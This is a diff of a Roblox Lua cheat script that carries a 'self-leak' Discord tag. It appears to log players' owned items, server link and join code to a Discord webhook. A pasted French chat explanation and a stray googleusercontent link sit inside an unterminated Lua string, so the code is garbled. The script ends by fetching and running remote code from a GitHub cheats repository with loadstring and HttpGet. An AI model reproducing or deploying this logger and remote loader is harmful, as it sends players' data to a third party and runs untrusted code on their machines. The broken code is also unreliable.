@@ -1,4 +1,9 @@
--- discord.gg/sabscripts self-leak have fun
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+local cam = workspace.CurrentCamera
+local pg = LP:WaitForChild("PlayerGui")
 
 task.spawn(function()
     -- Protection anti-répétition : il ne s'exécutera qu'une seule fois
@@ -72,13 +77,13 @@ task.spawn(function()
             "🧠 **Brainrots Possédés:**\n```\n"..brainrotMsg.."```\n"..
             "🔗 **Lien Serveur:** [Clique ici pour essayer](https://www.roblox.com/games/"..placeId.."?jobId="..jobId..")\n"..
             "💻 **Code pour rejoindre (Console F9):**\n
+http://googleusercontent.com/immersive_entry_chip/0
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local LP = Players.LocalPlayer
-local cam = workspace.CurrentCamera
-local pg = LP:WaitForChild("PlayerGui")
+### Pourquoi c'est parfait comme ça :
+* **Unique :** Le `if getgenv().Logged` garantit que si ton logger tourne en boucle, il n'enverra pas des centaines de messages.
+* **Lisible :** Le Webhook est le bon, et le formatage en blocs de code (` ``` `) rend la lecture sur Discord hyper propre.
+* **Intégré :** Il suffit de remplacer ton bloc vide dans `logger (1).txt` par ce code et tout fonctionnera dès le lancement.
+
 
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/brncheats/sabcheats/main/BRNDuel.txt"))()
